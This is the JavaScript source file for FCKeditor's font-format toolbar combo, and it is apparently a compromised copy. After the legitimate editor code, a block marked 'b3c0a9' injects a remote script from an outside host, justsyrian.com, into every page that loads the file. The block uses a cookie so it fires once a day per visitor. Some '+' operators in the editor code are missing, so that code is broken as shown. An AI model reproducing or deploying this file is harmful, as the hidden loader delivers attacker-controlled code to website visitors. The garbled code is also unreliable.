/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fcktoolbarfontformatcombo.js
 * 	FCKToolbarPanelButton Class: Handles the Fonts combo selector.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKToolbarFontFormatCombo = function( tooltip, style )
{
	this.Command	= FCKCommands.GetCommand( 'FontFormat' ) ;
	this.Label		= this.GetLabel() ;
	this.Tooltip	= tooltip ? tooltip : this.Label ;
	this.Style		= style ? style : FCK_TOOLBARITEM_ICONTEXT ;
	
	this.NormalLabel = 'Normal' ;
	
	this.PanelWidth = 190 ;
}

// Inherit from FCKToolbarSpecialCombo.
FCKToolbarFontFormatCombo.prototype = new FCKToolbarSpecialCombo ;

FCKToolbarFontFormatCombo.prototype.GetLabel = function()
{
	return FCKLang.FontFormat ;
}

FCKToolbarFontFormatCombo.prototype.CreateItems = function( targetSpecialCombo )
{
	// Get the format names from the language file.
	var aNames = FCKLang['FontFormats'].split(';') ;
	var oNames = {
		p		: aNames[0],
		pre		: aNames[1],
		address	: aNames[2],
		h1		: aNames[3],
		h2		: aNames[4],
		h3		: aNames[5],
		h4		: aNames[6],
		h5		: aNames[7],
		h6		: aNames[8],
		div		: aNames[9]
	} ;

	// Get the available formats from the configuration file.
	var aTags = FCKConfig.FontFormats.split(';') ;
	
	for ( var i = 0 ; i < aTags.length ; i   )
	{
		// Support for DIV in Firefox has been reintroduced on version 2.2.
//		if ( aTags[i] == 'div' && FCKBrowserInfo.IsGecko )
//			continue ;
		
		var sTag	= aTags[i] ;
		var sLabel	= oNames[sTag] ;
		
		if ( sTag == 'p' )
			this.NormalLabel = sLabel ;
		
		this._Combo.AddItem( sTag, '<div class="BaseFont"><'   sTag   '>'   sLabel   '</'   sTag   '></div>', sLabel ) ;
	}
}

if ( FCKBrowserInfo.IsIE )
{
	FCKToolbarFontFormatCombo.prototype.RefreshActiveItems = function( combo, value )
	{
//		FCKDebug.Output( 'FCKToolbarFontFormatCombo Value: '   value ) ;

		// IE returns normal for DIV and P, so to avoid confusion, we will not show it if normal.
		if ( value == this.NormalLabel )
		{
			if ( combo.Label != '&nbsp;' )
				combo.DeselectAll(true) ;
		}
		else
		{
			if ( this._LastValue == value )
				return ;

			combo.SelectItemByLabel( value, true ) ;
		}

		this._LastValue = value ;
	}
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
